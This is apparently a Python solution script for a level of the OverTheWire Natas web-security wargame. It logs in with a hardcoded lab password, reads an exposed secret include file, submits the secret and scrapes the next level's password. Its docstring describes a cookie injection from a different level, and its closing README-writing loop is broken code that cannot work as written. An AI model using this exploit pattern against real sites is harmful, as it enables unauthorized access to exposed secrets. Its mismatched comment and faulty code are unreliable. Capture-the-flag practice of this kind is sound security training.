#!/usr/bin/python3
import re
import requests

username = 'natas6'
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'

url = 'http://%s.natas.labs.overthewire.org/'%(username)
auth = (username, password)


response = requests.get(url, auth=auth)
print(response.text)



secret_url = url + 'includes/secret.inc'
#print(secret_url)
response = requests.get(secret_url, auth=auth)
#print(response.text)
secret = re.findall('secret = "(.*)"', response.text)[0]
#print(secret)
payload = {'secret' : secret, 'submit' : 'Submit'}
print(payload)

response = requests.post(url, auth=auth, data=payload)
print(response.text)

'''
Inspecting the webpage source code revealed the following:

    <body>
    <h1>natas4</h1>
    <div id="content">

    <body>
    <h1>natas5</h1>
    <div id="content">
    Access disallowed. You are not logged in</div>
    </body>
    </html>

With this in mind, I injected the appropriate 'loggedin' cookie
'''

next_password = (re.findall("natas7 is (.*)",response.text))[0]

print(next_password)

with open('README.md','a+') as file:
    for line in file:
        print(line.read())
        if username not in line:
            file.write(username + ' | ' + next_password +'\n')
file.close()


